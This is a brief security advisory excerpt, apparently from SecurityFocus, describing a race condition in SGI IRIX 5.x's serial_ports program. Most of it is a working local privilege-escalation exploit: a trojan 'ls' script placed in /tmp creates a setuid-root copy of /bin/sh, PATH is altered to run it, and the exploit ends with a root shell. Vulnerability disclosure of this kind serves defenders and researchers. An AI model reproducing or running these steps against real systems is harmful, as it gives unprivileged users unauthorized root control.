source: http://www.securityfocus.com/bid/464/info


A race condition exists in the serial_ports administrative program, as included by SGI in the 5.x Irix operating system. This race condition allows regular users to execute arbitrary commands as root.


cat > /tmp/ls
#!/bin/sh
cp /bin/sh /tmp/foo
chmod 4777 /tmp/foo
^D
chmod 755 /tmp/ls
cd /tmp
set PATH=( . $PATH )
/usr/lib/vadmin/serial_ports
# wait about 10-20 seconds and hit ^C, or wait for it to
# die out completely
/tmp/foo
# whoami
root

